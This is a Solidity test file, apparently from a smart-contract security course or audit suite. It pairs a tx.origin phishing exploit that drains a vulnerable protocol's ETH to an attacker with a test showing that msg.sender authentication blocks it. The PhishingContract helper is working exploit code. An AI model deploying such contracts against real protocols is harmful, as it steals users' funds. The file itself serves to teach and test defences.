// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/vulnerable/PA01_PA02_PA03_Vulnerable.sol";
import "../src/fixed/PA01_PA02_PA03_Fixed.sol";

contract PA01_TxOriginTest is Test {
    address payable public owner;
    address public attacker;
    PA01_TxOriginAuth public vulnProtocol;
    PA01_MsgSenderAuth public safeProtocol;

    function setUp() public {
        owner   = payable(makeAddr("owner"));
        attacker = makeAddr("attacker");
        vm.deal(owner, 1 ether);

        vulnProtocol = new PA01_TxOriginAuth(owner);
        safeProtocol = new PA01_MsgSenderAuth(owner);

        vm.deal(address(vulnProtocol), 5 ether);
        vm.deal(address(safeProtocol), 5 ether);
    }

    /**
     * @notice RED: Phishing contract exploits tx.origin auth
     *
     * Attacker deploys a phishing contract. Tricks owner into calling it.
     * The phishing contract calls withdrawAll() on the victim protocol.
     * tx.origin == owner passes, but msg.sender == phishing contract.
     */
    function test_RED_PhishingContractExploitsTxOrigin() public {
        console.log("=== PA-01 TX.ORIGIN AUTH EXPLOIT ===");

        // Deploy phishing contract that will call withdrawAll on behalf of attacker
        PhishingContract phisher = new PhishingContract(address(vulnProtocol), payable(attacker));

        uint256 protocolBalanceBefore = address(vulnProtocol).balance;
        console.log("Protocol balance before:", protocolBalanceBefore / 1e18, "ETH");

        // Owner is tricked into calling the phishing contract (e.g., fake airdrop claim)
        // tx.origin == owner throughout this call chain
        vm.prank(owner, owner); // prank(msgSender, txOrigin) - owner is tx.origin
        phisher.triggerExploit();

        console.log("Protocol balance after:", address(vulnProtocol).balance / 1e18, "ETH");
        console.log("Attacker balance:", attacker.balance / 1e18, "ETH");

        assertEq(address(vulnProtocol).balance, 0, "Protocol drained via tx.origin phishing");
        assertEq(attacker.balance, protocolBalanceBefore, "Attacker got all funds");
    }

    /**
     * @notice GREEN: msg.sender check blocks phishing attack
     */
    function test_GREEN_MsgSenderBlocksPhishing() public {
        console.log("=== PA-01 FIXED: msg.sender auth ===");

        PhishingContractSafe phisher = new PhishingContractSafe(address(safeProtocol), payable(attacker));

        uint256 balanceBefore = address(safeProtocol).balance;

        // Owner is tricked into calling phishing contract - but safeProtocol uses msg.sender
        vm.prank(owner, owner);
        vm.expectRevert("not owner");
        phisher.triggerExploit();

        assertEq(address(safeProtocol).balance, balanceBefore, "Protocol funds safe");
        console.log("Phishing blocked. Protocol balance:", address(safeProtocol).balance / 1e18, "ETH");
    }
}

// Helper: phishing contract that calls the vulnerable protocol
contract PhishingContract {
    PA01_TxOriginAuth public target;
    address payable public attacker;

    constructor(address _target, address payable _attacker) {
        target   = PA01_TxOriginAuth(payable(_target));
        attacker = _attacker;
    }

    function triggerExploit() external {
        // tx.origin is still the owner who called us
        target.withdrawAll(attacker);
    }

    receive() external payable {}
}

contract PhishingContractSafe {
    PA01_MsgSenderAuth public target;
    address payable public attacker;

    constructor(address _target, address payable _attacker) {
        target   = PA01_MsgSenderAuth(payable(_target));
        attacker = _attacker;
    }

    function triggerExploit() external {
        // msg.sender here will be this contract, not the owner
        target.withdrawAll(attacker);
    }

    receive() external payable {}
}
